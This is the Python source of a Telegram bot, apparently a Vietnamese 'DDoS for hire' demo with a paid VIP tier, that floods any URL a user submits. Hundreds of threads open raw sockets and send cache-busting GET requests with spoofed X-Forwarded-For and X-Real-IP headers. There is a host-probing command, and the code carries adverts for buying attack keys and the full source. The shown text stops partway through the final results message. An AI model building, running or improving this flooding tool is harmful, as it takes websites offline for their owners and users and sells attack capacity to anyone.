import socket
import ssl
import threading
import time
import random
import sys
import requests
from urllib.parse import urlparse
import telebot
from telebot import types

class AdvancedTelegramDDoS:
    def __init__(self, token):
        self.token = token
        self.bot = telebot.TeleBot(token)
        self.requests_count = 0
        self.success_count = 0
        self.running = False
        self.lock = threading.Lock()
        self.current_attack = None
        # Anh em đặt key ở đây
        self.vip_keys = {
            "heovl": True, # key riêng 
            "viet69": True, # Key backup
            "xnxx": True    # Key phụ
        }
        self.active_vip_sessions = {}
        
        self.setup_handlers()
        
    def setup_handlers(self):
        @self.bot.message_handler(commands=['start', 'help'])
        def start(message):
            self.show_main_menu(message.chat.id)
            
        @self.bot.message_handler(commands=['ddos'])
        def ddos_cmd(message):
            self.show_ddos_menu(message.chat.id)
            
        @self.bot.message_handler(commands=['attack'])
        def attack_cmd(message):
            self.handle_attack_command(message)
            
        @self.bot.message_handler(commands=['stop'])
        def stop_cmd(message):
            self.stop_attack_command(message.chat.id)
            
        @self.bot.message_handler(commands=['status'])
        def status_cmd(message):
            self.show_status(message.chat.id)
            
        @self.bot.message_handler(commands=['checkhost'])
        def checkhost_cmd(message):
            self.handle_checkhost(message)
            
        @self.bot.message_handler(commands=['info'])
        def info_cmd(message):
            self.show_info(message.chat.id)
            
        @self.bot.message_handler(commands=['vip'])
        def vip_cmd(message):
            self.handle_vip_command(message)
            
        @self.bot.callback_query_handler(func=lambda call: True)
        def handle_callback(call):
            if call.data == "quick_ddos":
                if self.check_vip_access(call.message.chat.id):
                    self.bot.send_message(call.message.chat.id, "🚀 Gửi link target để tấn công nhanh!\n\n✅ Bạn đang sử dụng VIP - Không giới hạn")
                else:
                    self.bot.send_message(call.message.chat.id, "🚀 Gửi link target để tấn công nhanh!\n\n⚠️ Bản DEMO giới hạn 60 giây")
            elif call.data == "custom_ddos":
                if self.check_vip_access(call.message.chat.id):
                    self.bot.send_message(call.message.chat.id, "⚙️ Dùng lệnh: /attack <url> <time> <threads>\n\n✅ Bạn đang sử dụng VIP - Không giới hạn")
                else:
                    self.bot.send_message(call.message.chat.id, "⚙️ Dùng lệnh: /attack <url> <time> <threads>\n\n⚠️ Bản DEMO giới hạn 60 giây")
            elif call.data == "check_host":
                self.bot.send_message(call.message.chat.id, "🔍 Dùng lệnh: /checkhost <url>")
            elif call.data == "status_info":
                self.show_status(call.message.chat.id)
            elif call.data == "vip_info":
                self.show_vip_info(call.message.chat.id)
            
        @self.bot.message_handler(func=lambda message: True)
        def handle_all(message):
            if message.text.startswith('http'):
                self.quick_attack(message)
            elif message.text == '🚀 TẤN CÔNG DDOS':
                self.show_ddos_menu(message.chat.id)
            elif message.text == '📊 TRẠNG THÁI':
                self.show_status(message.chat.id)
            elif message.text == '🔍 CHECK HOST':
                self.bot.send_message(message.chat.id, "🔍 Dùng lệnh: /checkhost <url>")
            elif message.text == '🛑 DỪNG TẤN CÔNG':
                self.stop_attack_command(message.chat.id)
            elif message.text == '💰 KÍCH HOẠT VIP':
                self.show_vip_info(message.chat.id)
            elif message.text == 'ℹ️ THÔNG TIN':
                self.show_info(message.chat.id)
            else:
                self.show_main_menu(message.chat.id)
    
    def check_vip_access(self, chat_id):
        """Kiểm tra quyền VIP"""
        return self.active_vip_sessions.get(chat_id, False)
    
    def handle_vip_command(self, message):
        """Xử lý lệnh VIP"""
        try:
            parts = message.text.split()
            if len(parts) < 2:
                self.show_vip_info(message.chat.id)
                return
                
            key = parts[1].strip().upper()
            
            if key in self.vip_keys:
                self.active_vip_sessions[message.chat.id] = True
                self.bot.send_message(message.chat.id,
                                    "🎉 𝐊𝐈́𝐂𝐇 𝐇𝐎𝐀̣𝐓 𝐕𝐈𝐏 𝐓𝐇𝐀̀𝐍𝐇 𝐂𝐎̂𝐍𝐆!\n\n"
                                    "✅ Bạn đã kích hoạt quyền VIP thành công\n"
                                    "⚡ Giờ bạn có thể:\n"
                                    "• Tấn công KHÔNG GIỚI HẠN thời gian\n"
                                    "• Sử dụng UNLIMITED threads\n"
                                    "• Tốc độ RPS cực cao\n"
                                    "• Toàn bộ tính năng Premium")
            else:
                self.bot.send_message(message.chat.id,
                                    "❌ 𝐊𝐄𝐘 𝐕𝐈𝐏 𝐊𝐇𝐎̂𝐍𝐆 𝐇𝐎̛̣𝐏 𝐋𝐄̣̂!\n\n"
                                    "📝 Key VIP bạn nhập không đúng\n"
                                    "💳 Để mua Key VIP, vui lòng:\n"
                                    "• 🌐 Website: https://darkstack.online\n"
                                    "• 📱 Telegram: @eneyota\n"
                                    "• 💰 Nhận key VIP ngay!")
                    
        except Exception as e:
            self.bot.send_message(message.chat.id, f"❌ 𝐋𝐨̂̃𝐢: {e}")
    
    def show_vip_info(self, chat_id):
        """Hiển thị thông tin VIP"""
        vip_info = """
💰 𝐓𝐇𝐎̂𝐍𝐆 𝐓𝐈𝐍 𝐕𝐈𝐏

🔑 𝐊𝐈́𝐂𝐇 𝐇𝐎𝐀̣𝐓 𝐕𝐈𝐏:
/vip <key>

🎯 𝐐𝐔𝐘𝐄̂̀𝐍 𝐋𝐎̛̣𝐈 𝐕𝐈𝐏:
• ⚡ Tấn công KHÔNG GIỚI HẠN thời gian
• 🚀 UNLIMITED threads (5000+)
• 💥 Max RPS: 50,000+ requests
• 🔧 Toàn bộ tính năng Premium
• 📊 Priority Support

💳 𝐌𝐔𝐀 𝐊𝐄𝐘 𝐕𝐈𝐏:
• 🌐 Website: https://darkstack.online
• 📱 Telegram: @eneyota
• 💰 Giá: Liên hệ để biết thêm

🔒 𝐋𝐈𝐄𝐍 𝐇𝐄̣̂ Đ𝐄̂̉ 𝐍𝐇𝐀̣̂𝐍 𝐊𝐄𝐘 𝐕𝐈𝐏
"""
        self.bot.send_message(chat_id, vip_info)

    def handle_checkhost(self, message):
        """Kiểm tra host trước khi tấn công"""
        try:
            parts = message.text.split()
            if len(parts) < 2:
                self.bot.send_message(message.chat.id, 
                                    "❌ 𝐒𝐀𝐈 𝐂𝐔́ 𝐏𝐇𝐀́𝐏\n"
                                    "📝 𝐒𝐮̛̉ 𝐝𝐮̣𝐧𝐠: /checkhost <url>\n"
                                    "🎯 𝐕𝐢́ 𝐝𝐮̣: /checkhost https://example.com")
                return
                
            target = parts[1]
            if not target.startswith(('http://', 'https://')):
                self.bot.send_message(message.chat.id, "❌ URL phải bắt đầu bằng http:// hoặc https://")
                return
            
            self.bot.send_message(message.chat.id, "🔍 𝐄𝐍𝐆𝐈𝐍𝐄𝐄𝐑𝐈𝐍𝐆...")
            
            # Phân tích target
            parsed = urlparse(target)
            host = parsed.hostname
            
            check_info = f"""
🔍 𝐊𝐈𝐄̂̉𝐌 𝐓𝐑𝐀 𝐇𝐎𝐒𝐓 𝐈𝐍𝐅𝐎 - 𝐁𝐎𝐓 𝐇𝐐𝐇 𝐕.𝟏 𝐏𝐑𝐄𝐌𝐈𝐔𝐌

🌐 𝐓𝐚𝐫𝐠𝐞𝐭: {target}
🔗 𝐇𝐨𝐬𝐭𝐧𝐚𝐦𝐞: {host}
📡 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥: {parsed.scheme.upper()}
🛣️ 𝐏𝐚𝐭𝐡: {parsed.path if parsed.path else '/'}

⏳ 𝐄𝐧𝐠𝐢𝐧𝐞𝐞𝐫𝐢𝐧𝐠 𝐬𝐞𝐫𝐯𝐞𝐫...
            """
            
            self.bot.send_message(message.chat.id, check_info)
            
            try:
                start_time = time.time()
                response = requests.get(target, timeout=10)
                response_time = (time.time() - start_time) * 1000
                
                result = f"""
✅ 𝐇𝐎𝐒𝐓 𝐀𝐂𝐓𝐈𝐕𝐄 - 𝐁𝐎𝐓 𝐇𝐐𝐇 𝐕.𝟏 𝐏𝐑𝐄𝐌𝐈??𝐌

📊 𝐊𝐄̂𝐓 𝐐𝐔𝐀̉ 𝐊𝐈𝐄̂̉𝐌 𝐓𝐑??:
• 🟢 Status: ONLINE
• 📡 Response Code: {response.status_code}
• ⚡ Response Time: {response_time:.2f}ms
• 🔒 Protocol: {parsed.scheme.upper()}
• 🌐 Server: {response.headers.get('Server', 'Unknown')}

🎯 𝐇𝐎𝐒𝐓 𝐒𝐀̆̃𝐍 𝐒𝐀̀𝐍𝐆 𝐂𝐇𝐎 𝐓𝐀̂𝐍 𝐂𝐎̂𝐍𝐆!
                """
                
            except Exception as e:
                result = f"""
❌ 𝐇𝐎𝐒𝐓 𝐏𝐑𝐎𝐁𝐋𝐄𝐌 - 𝐁𝐎𝐓 𝐇𝐐𝐇 𝐕.𝟏 𝐏𝐑𝐄𝐌𝐈𝐔𝐌

📊 𝐊𝐄̂𝐓 𝐐𝐔𝐀̉ 𝐊𝐈𝐄̂̉𝐌 𝐓𝐑𝐀:
• 🔴 Status: OFFLINE
• 💀 Error: {str(e)}
• 🚫 Không thể kết nối tới host

⚠️ 𝐊𝐇𝐎̂𝐍𝐆 𝐓𝐇𝐄̂̉ 𝐓𝐀̂𝐍 𝐂𝐎̂𝐍𝐆 𝐇𝐎𝐒𝐓 𝐍𝐀̀𝐘!
                """
            
            self.bot.send_message(message.chat.id, result)
            
        except Exception as e:
            self.bot.send_message(message.chat.id, f"❌ 𝐋𝐨̂̃𝐢 𝐤𝐢𝐞̂̉𝐦 𝐭𝐫𝐚 𝐡𝐨𝐬𝐭: {e}")

    def handle_attack_command(self, message):
        """Xử lý lệnh tấn công với kiểm tra VIP"""
        try:
            parts = message.text.split()
            if len(parts) < 4:
                self.bot.send_message(message.chat.id, 
                                    "❌ 𝐒𝐀𝐈 𝐂𝐔́ 𝐏𝐇𝐀́𝐏\n\n"
                                    "📝 𝐒𝐮̛̉ 𝐝𝐮̣𝐧𝐠:\n"
                                    "/attack <url> <time> <threads>\n\n"
                                    "🎯 𝐕𝐢́ 𝐝𝐮̣:\n"
                                    "/attack https://example.com 60 200")
                return
            
            target = parts[1]
            duration = int(parts[2])
            threads = int(parts[3])
            
            if not target.startswith(('http://', 'https://')):
                self.bot.send_message(message.chat.id, "❌ URL phải bắt đầu bằng http:// hoặc https://")
                return
            
            is_vip = self.check_vip_access(message.chat.id)
            
            if not is_vip:
                # GIỚI HẠN BẢN DEMO
                if duration > 60:
                    self.bot.send_message(message.chat.id, 
                                        "⚠️ 𝐁𝐀̉𝐍 𝐃𝐄𝐌𝐎 𝐆𝐈𝐎̛́𝐈 𝐇𝐀̣𝐍\n\n"
                                        "• Thời gian tối đa: 60 giây\n"
                                        "• Mua VIP để không giới hạn\n"
                                        "• 🔑 Dùng lệnh: /vip <key>\n"
                                        "• 🌐 Website: https://darkstack.online")
                    duration = 60
                    
                if threads > 500:
                    self.bot.send_message(message.chat.id, 
                                        "⚠️ 𝐁𝐀̉𝐍 𝐃𝐄𝐌𝐎 𝐆𝐈𝐎̛́𝐈 𝐇𝐀̣𝐍\n\n"
                                        "• Threads tối đa: 500\n"
                                        "• Mua VIP để không giới hạn\n"
                                        "• 🔑 Dùng lệnh: /vip <key>\n"
                                        "• 🌐 Website: https://darkstack.online")
                    threads = 500
            else:
                # KIỂM TRA GIỚI HẠN VIP Ở ĐÂY, ĐẶT SAO CX DC
                if duration > 86400:  # 24 giờ
                    self.bot.send_message(message.chat.id, 
                                        "⚠️ 𝐂𝐀̉𝐍𝐇 𝐁𝐀́𝐎 𝐕𝐈𝐏\n\n"
                                        "• Thời gian: 24h+\n"
                                        "• Có thể ảnh hưởng server\n"
                                        "• Tiếp tục tấn công...")
                    
                if threads > 5000:
                    self.bot.send_message(message.chat.id, 
                                        "⚠️ 𝐂𝐀̉𝐍𝐇 𝐁𝐀́𝐎 𝐕𝐈𝐏\n\n"
                                        "• Threads: 5000+\n"
                                        "• Có thể làm chậm hệ thống\n"
                                        "• Tiếp tục tấn công...")
            if is_vip:
                attack_type = "✅ 𝐕𝐈𝐏 - 𝐊𝐇𝐎̂𝐍𝐆 𝐆𝐈𝐎̛́𝐈 𝐇𝐀̣𝐍"
            else:
                attack_type = "⚠️ 𝐃𝐄𝐌𝐎 - 𝐆𝐈𝐎̛́𝐈 𝐇𝐀̣𝐍"
            
            attack_msg = f"""
🎯 𝐓𝐇𝐎̂𝐍𝐆 𝐒𝐎̂́ 𝐓𝐀̂𝐍 𝐂𝐎̂𝐍𝐆

{attack_type}
🎯 𝐓𝐚𝐫𝐠𝐞𝐭: {target}
⏰ 𝐓𝐡𝐨̛̀𝐢 𝐠𝐢𝐚𝐧: {duration}𝐬
🧵 𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {threads}
💥 𝐏𝐡𝐮̛𝐨̛𝐧𝐠 𝐭𝐡𝐮̛́𝐜: 𝐑𝐀𝐖 𝐒𝐎𝐂𝐊𝐄𝐓

⚡ 𝐊𝐡𝐨̛̉𝐢 𝐜𝐡𝐚̣𝐲 𝐭𝐚̂́𝐧 𝐜𝐨̂𝐧𝐠...
            """
            
            self.bot.send_message(message.chat.id, attack_msg)
            self.start_attack(target, duration, threads, message.chat.id)
            
        except Exception as e:
            self.bot.send_message(message.chat.id, f"❌ 𝐋𝐨̂̃𝐢: {e}")

    def quick_attack(self, message):
        """Tấn công nhanh với kiểm tra VIP"""
        target = message.text.strip()
        if not target.startswith(('http://', 'https://')):
            self.bot.send_message(message.chat.id, "❌ Link phải bắt đầu bằng http:// hoặc https://")
            return
        
        is_vip = self.check_vip_access(message.chat.id)
        
        if is_vip:
            # THÔNG SỐ CHO KEY VIP NÈ
            duration = 300  # 5 phút
            threads = 1000  # 1000 thread
            attack_type = "✅ 𝐕𝐈𝐏 - 𝐊𝐇𝐎̂𝐍𝐆 𝐆𝐈𝐎̛́𝐈 𝐇𝐀̣𝐍"
        else:
            # THÔNG SỐ TEST CHO NGƯỜI KO MUA KEY VIP
            duration = 60   # 1 phút
            threads = 200   # 200 thread
            attack_type = "⚠️ 𝐃𝐄𝐌𝐎 - 𝐆𝐈𝐎̛́𝐈 𝐇𝐀̣𝐍"
        
        attack_msg = f"""
🚀 𝐊𝐈́𝐂𝐇 𝐇𝐎𝐀̣𝐓 𝐓𝐀̂𝐍 𝐂𝐎̂𝐍𝐆 𝐍𝐇𝐀𝐍𝐇

{attack_type}
🎯 𝐓𝐚𝐫𝐠𝐞𝐭: {target}
⏰ 𝐓𝐡𝐨̛̀𝐢 𝐠𝐢𝐚𝐧: {duration}𝐬
🧵 𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {threads}
💥 𝐏𝐡𝐮̛𝐨̛𝐧𝐠 𝐭𝐡𝐮̛́𝐜: 𝐑𝐀𝐖 𝐒𝐎𝐂𝐊𝐄𝐓

⚡ 𝐊𝐡𝐨̛̉𝐢 𝐜𝐡𝐚̣𝐲 𝐭𝐚̂́𝐧 𝐜𝐨̂𝐧𝐠...
        """
        
        self.bot.send_message(message.chat.id, attack_msg)
        self.start_attack(target, duration, threads, message.chat.id)

    def show_main_menu(self, chat_id):
        """Menu chính với thông tin VIP"""
        is_vip = self.check_vip_access(chat_id)
        vip_status = "✅ 𝐕𝐈𝐏 𝐀𝐂𝐓𝐈𝐕𝐄" if is_vip else "🔒 𝐂𝐇𝐔̛𝐀 𝐊𝐈́𝐂𝐇 𝐇𝐎𝐀̣𝐓 𝐕𝐈𝐏"
        
        menu_text = f"""
🦠 𝐁𝐎𝐓 𝐃𝐃𝐎𝐒 𝐖𝐄𝐁𝐒𝐈𝐓𝐄 𝐇𝐐𝐇 𝐓𝐄𝐀𝐌 𝐕.𝟏 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 🦠

╔══════════════════════════════╗
║    𝐁𝐎𝐓 𝐃𝐃𝐎𝐒 𝐖𝐄𝐁𝐒𝐈𝐓𝐄 𝐇𝐐𝐇     ║
║       𝐓𝐄𝐀𝐌 𝐕.𝟏 𝐏𝐑𝐄𝐌𝐈𝐔𝐌      ║
╚══════════════════════════════╝

🔰 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐕𝐈𝐏:
• /start - Menu chính
• /ddos - Menu tấn công
• /attack - Tấn công tùy chỉnh
• /vip - Kích hoạt VIP
• /stop - Dừng tấn công
• /status - Trạng thái
• /checkhost - Kiểm tra host
• /info - Thông tin bot

🎯 𝐓𝐑𝐀̣𝐍𝐆 𝐓𝐇𝐀́𝐈: {vip_status}

{'⚡ 𝐕𝐈𝐏 𝐁𝐄𝐍𝐄𝐅𝐈𝐓𝐒: • KHÔNG GIỚI HẠN • MAX POWER • PRIORITY' if is_vip else '⚠️ 𝐃𝐄𝐌𝐎 𝐋𝐈𝐌𝐈𝐓𝐒: • 60s • 500 threads • Basic features'}

📞 𝐓𝐇𝐎̂𝐍𝐆 𝐓𝐈𝐍 𝐋𝐈𝐄𝐍 𝐇𝐄̣̂:
• 👨💻 Developer: HUYPC
• 📱 Telegram: @eneyota
• 💬 Zalo Chat: zalo.me/g/jtkizz091
• 📢 Channel: t.me/hqhteam
• 🎥 Youtube: youtube.com/@plahuydzvcl
• 👥 Team: HQH LIMITED TEAM

🚨 𝐓𝐇𝐎̂𝐍𝐆 𝐁𝐀́𝐎 𝐐𝐔𝐀𝐍 𝐓𝐑𝐎̣𝐍𝐆:
• ⚠️ Đây là bản demo miễn phí
• 💰 Mua Full Source Code tại:
• 🌐 Website: https://darkstack.online
• 📧 Liên hệ: @eneyota (Telegram)
        """
        
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        btn1 = types.KeyboardButton('🚀 TẤN CÔNG DDOS')
        btn2 = types.KeyboardButton('📊 TRẠNG THÁI')
        btn3 = types.KeyboardButton('🔍 CHECK HOST')
        btn4 = types.KeyboardButton('🛑 DỪNG TẤN CÔNG')
        btn5 = types.KeyboardButton('💰 KÍCH HOẠT VIP')
        markup.add(btn1, btn2, btn3, btn4, btn5)
        
        self.bot.send_message(chat_id, menu_text, reply_markup=markup)

    def show_ddos_menu(self, chat_id):
        """Menu DDoS chi tiết"""
        is_vip = self.check_vip_access(chat_id)
        vip_status = "✅ 𝐕𝐈𝐏 - 𝐊𝐇𝐎̂𝐍𝐆 𝐆𝐈𝐎̛́𝐈 𝐇𝐀̣𝐍" if is_vip else "⚠️ 𝐃𝐄𝐌𝐎 - 𝐆𝐈𝐎̛́𝐈 𝐇𝐀̣𝐍"
        
        ddos_menu = f"""
🎯 𝐌𝐄𝐍𝐔 𝐓𝐀̂𝐍 𝐂𝐎̂𝐍𝐆 𝐃𝐃𝐎𝐒 - 𝐁𝐎𝐓 𝐇𝐐𝐇 𝐕.𝟏 𝐏𝐑𝐄𝐌𝐈𝐔𝐌

🔰 𝐓𝐑𝐀̣𝐍𝐆 𝐓𝐇𝐀́𝐈: {vip_status}

⚠️  𝐓𝐇𝐎̂𝐍𝐆 𝐁𝐀́𝐎 𝐐𝐔𝐀𝐍 𝐓𝐑𝐎̣𝐍𝐆:
• Đây là bản DEMO miễn phí
• Giới hạn 1 phút tấn công
• Mua VIP để không giới hạn
• 🌐 Website: https://darkstack.online

𝐂𝐀́𝐂𝐇 𝐒𝐔̛̉ 𝐃𝐔̣𝐍𝐆:

??. 𝐓𝐀̂𝐍 𝐂𝐎̂𝐍𝐆 𝐍𝐇𝐀𝐍𝐇:
   Gửi link target trực tiếp
   📝 Ví dụ: https://example.com

𝟐. 𝐓𝐀̂𝐍 𝐂𝐎̂𝐍𝐆 𝐂𝐇𝐔𝐘𝐄̂𝐍 𝐍𝐆𝐇𝐈𝐄̣𝐏:
   /attack <url> <time> <threads>
   📝 Ví dụ: /attack https://target.com 60 200

𝟑. 𝐂𝐇𝐄𝐂𝐊 𝐇𝐎𝐒𝐓 𝐓𝐑𝐔̛𝐎̛́𝐂 𝐊𝐇𝐈 𝐓𝐀̂𝐍 𝐂𝐎̂𝐍𝐆:
   /checkhost <url>
   📝 Ví dụ: /checkhost https://target.com

{'⚡ 𝐕𝐈𝐏 𝐓𝐇𝐎̂𝐍𝐆 𝐒𝐎̂́: • Time: UNLIMITED • Threads: 5000+ • RPS: 50,000+' if is_vip else '⚡ 𝐃𝐄𝐌𝐎 𝐓𝐇𝐎̂𝐍𝐆 𝐒𝐎̂́: • Time: 60s • Threads: 500 • RPS: 5,000+'}
        """
        
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("🚀 TẤN CÔNG NHANH", callback_data="quick_ddos"),
            types.InlineKeyboardButton("⚙️ TÙY CHỈNH", callback_data="custom_ddos")
        )
        markup.row(
            types.InlineKeyboardButton("🔍 CHECK HOST", callback_data="check_host"),
            types.InlineKeyboardButton("💰 MUA VIP", url="https://darkstack.online")
        )
        
        self.bot.send_message(chat_id, ddos_menu, reply_markup=markup)

    def stop_attack_command(self, chat_id):
        """Dừng tấn công"""
        if self.running:
            self.running = False
            self.bot.send_message(chat_id, "🛑 𝐃𝐀̃ 𝐃𝐔̛̀𝐍𝐆 𝐓𝐀̂𝐍 𝐂𝐎̂𝐍𝐆! - 𝐁𝐎𝐓 𝐇𝐐𝐇 𝐕.𝟏 𝐏𝐑𝐄𝐌𝐈𝐔𝐌")
        else:
            self.bot.send_message(chat_id, "ℹ️ 𝐊𝐡𝐨̂𝐧𝐠 𝐜𝐨́ 𝐜𝐮𝐨̣̂𝐜 𝐭𝐚̂𝐧 𝐜𝐨̂𝐧𝐠 𝐧𝐚̀𝐨 đ𝐚𝐧𝐠 𝐜𝐡𝐚̣𝐲")

    def show_status(self, chat_id):
        """Hiển thị trạng thái"""
        is_vip = self.check_vip_access(chat_id)
        vip_status = "✅ 𝐕𝐈𝐏" if is_vip else "🔒 𝐃𝐄𝐌𝐎"
        
        stats = f"""
📊 𝐓𝐑𝐀̣𝐍𝐆 𝐓𝐇𝐀́𝐈 𝐇𝐄̣̂ 𝐓𝐇𝐎̂́𝐍𝐆 - 𝐁𝐎𝐓 𝐇𝐐𝐇 𝐕.𝟏 𝐏𝐑𝐄𝐌𝐈𝐔𝐌

💥 𝐓𝐨𝐭𝐚𝐥 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐬: {self.requests_count:,}
✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥: {self.success_count:,}
🔴 𝐀𝐭𝐭𝐚𝐜𝐤 𝐑𝐮𝐧𝐧𝐢𝐧𝐠: {'𝐂𝐎́' if self.running else '𝐊𝐇𝐎̂𝐍𝐆'}
🎯 𝐓𝐫𝐚̣𝐧𝐠 𝐭𝐡𝐚́𝐢: {vip_status}

{'⚡ 𝐕𝐈𝐏: KHÔNG GIỚI HẠN - MAX POWER' if is_vip else '💡 𝐃𝐄𝐌𝐎: Mua VIP để mở khóa toàn bộ tính năng'}
        """
        
        if self.running and self.current_attack:
            elapsed = time.time() - self.current_attack['start_time']
            rps = self.requests_count / max(elapsed, 1)
            stats += f"\n🎯 𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐓𝐚𝐫𝐠𝐞𝐭: {self.current_attack['target']}"
            stats += f"\n⏰ 𝐑𝐮𝐧𝐧𝐢𝐧𝐠 𝐓𝐢𝐦𝐞: {elapsed:.1f}𝐬"
            stats += f"\n🚀 𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐑𝐏𝐒: {rps:,.0f}"
        
        self.bot.send_message(chat_id, stats)

    def show_info(self, chat_id):
        """Hiển thị thông tin bot"""
        info = """
ℹ️ 𝐓𝐇𝐎̂𝐍𝐆 𝐓𝐈𝐍 𝐁𝐎𝐓 - 𝐁𝐎𝐓 𝐃𝐃𝐎𝐒 𝐖𝐄𝐁𝐒𝐈𝐓𝐄 𝐇𝐐𝐇 𝐓𝐄𝐀𝐌 𝐕.𝟏 𝐏𝐑𝐄𝐌𝐈𝐔𝐌

🦠 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞: 𝐁𝐎𝐓 𝐃𝐃𝐎𝐒 𝐖𝐄𝐁𝐒𝐈𝐓𝐄 𝐇𝐐𝐇 𝐓𝐄𝐀𝐌
⚡ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧: 𝐕.𝟏 𝐏𝐑𝐄𝐌𝐈𝐔𝐌
🔧 𝐏𝐨𝐰𝐞𝐫: 𝐑𝐚𝐰 𝐒𝐨𝐜𝐤𝐞𝐭 𝐀𝐭𝐭𝐚𝐜𝐤
🎯 𝐌𝐚𝐱 𝐑𝐏𝐒: 50,000+ (VIP)

👥 𝐓𝐄𝐀𝐌 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍:
• 👨💻 Developer: HUYPC
• 📱 Telegram: @eneyota
• 💬 Zalo Chat: Tham gia nhóm Zalo
• 📢 Channel: t.me/hqhteam
• 🎥 Youtube: Youtube.com/@plahuydzvcl
• 🏢 Team: HQH LIMITED TEAM

💰 𝐌𝐔𝐀 𝐕𝐈𝐏:
• 🌐 Website: https://darkstack.online
• 📧 Liên hệ: @eneyota (Telegram)
• 💰 Nhận key VIP ngay!

🚨 𝐂𝐇𝐔́ 𝐘́ 𝐐𝐔𝐀𝐍 𝐓𝐑𝐎̣𝐍𝐆:
• Đây là bản DEMO miễn phí
• Giới hạn thời gian và tính năng
• Mua VIP để sử dụng không giới hạn
• Hỗ trợ cài đặt và custom theo yêu cầu

𝐓𝐈́𝐍𝐇 𝐍𝐀̆𝐍𝐆 𝐂𝐇𝐈́𝐍𝐇:
• ✅ DDoS Raw Socket
• ✅ Multi-Threading  
• ✅ Check Host Info
• ✅ Real-time Status
• ✅ Quick Attack
• ✅ Custom Attack (VIP)
        """
           
        self.bot.send_message(chat_id, info)

    # huypc
    def generate_request(self, host, path):
        """Tạo HTTP request raw"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", 
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
        ]
        
        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        request = f"GET {path}?{random.randint(1000000,9999999)} HTTP/1.1\r\n"
        request += f"Host: {host}\r\n"
        request += f"User-Agent: {random.choice(user_agents)}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        request += f"X-Forwarded-For: {fake_ip}\r\n"
        request += f"X-Real-IP: {fake_ip}\r\n"
        request += "Connection: close\r\n"
        request += "\r\n"
        
        return request.encode()
    
    def attack_thread(self, target, chat_id, duration):
        """Thread tấn công"""
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == 'https' else 80
        path = parsed.path if parsed.path else "/"
        
        end_time = time.time() + duration
        
        while time.time() < end_time and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((host, port))
                
                if parsed.scheme == 'https':
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)
                
                request_data = self.generate_request(host, path)
                sock.send(request_data)
                
                with self.lock:
                    self.requests_count += 1
                    self.success_count += 1
                
                sock.close()
                
            except Exception:
                with self.lock:
                    self.requests_count += 1
    
    def start_attack(self, target, duration, threads, chat_id):
        """Bắt đầu tấn công"""
        if self.running:
            self.bot.send_message(chat_id, "❌ Đang có cuộc tấn công khác chạy, dùng /stop để dừng")
            return
            
        self.running = True
        self.requests_count = 0
        self.success_count = 0
        self.current_attack = {
            'target': target,
            'start_time': time.time(),
            'chat_id': chat_id
        }
        
        attack_thread = threading.Thread(
            target=self._run_attack,
            args=(target, duration, threads, chat_id)
        )
        attack_thread.daemon = True
        attack_thread.start()
    
    def _run_attack(self, target, duration, threads, chat_id):
        """Chạy attack trong background"""
        start_time = time.time()
        
        thread_pool = []
        for i in range(threads):
            thread = threading.Thread(
                target=self.attack_thread,
                args=(target, chat_id, duration)
            )
            thread.daemon = True
            thread_pool.append(thread)
            thread.start()
        
        last_update = 0
        while time.time() - start_time < duration and self.running:
            elapsed = time.time() - start_time
            
            if elapsed - last_update >= 10:
                rps = self.requests_count / max(elapsed, 1)
                success_rate = (self.success_count / max(self.requests_count, 1)) * 100
                
                status = f"""
🔥 𝐓𝐀̂𝐍 𝐂𝐎̂𝐍𝐆 𝐃𝐀𝐍𝐆 𝐂𝐇𝐀𝐘𝐘 - 𝐁𝐎𝐓 𝐇𝐐𝐇 𝐕.𝟏 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 🔥

🎯 𝐓𝐚𝐫𝐠𝐞𝐭: {target}
💥 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐬: {self.requests_count:,}
✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬: {self.success_count:,}
📈 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {success_rate:.1f}%
🚀 𝐑𝐏𝐒: {rps:,.0f}
⏰ 𝐓𝐢𝐦𝐞: {elapsed:.1f}𝐬 / {duration}𝐬
                """
                
                self.bot.send_message(chat_id, status)
                last_update = elapsed
                
            time.sleep(1)
        
        total_time = time.time() - start_time
        avg_rps = self.requests_count / max(total_time, 1)
        final_success_rate = (self.success_count / max(self.requests_count, 1)) * 100
        
        result = f"""
🎉 𝐓𝐀̂𝐍 ??𝐎̂𝐍𝐆 𝐇𝐎𝐀̀𝐍 𝐓𝐀̂𝐓! - 𝐁𝐎𝐓 𝐇??𝐇 𝐕.𝟏 𝐏𝐑𝐄𝐌𝐈𝐔𝐌

📊 𝐊𝐄̂𝐓 𝐐𝐔𝐀̉ 𝐂𝐔𝐎̂́𝐈 𝐂𝐔̀𝐍𝐆:
• 🎯 Target: {target}
• 💥 Total Requests: {self.requests_count:,}
• ✅ Successful: {self.success_count:,}
• 📈 Success Rate: {final_success_rate:.1f}%
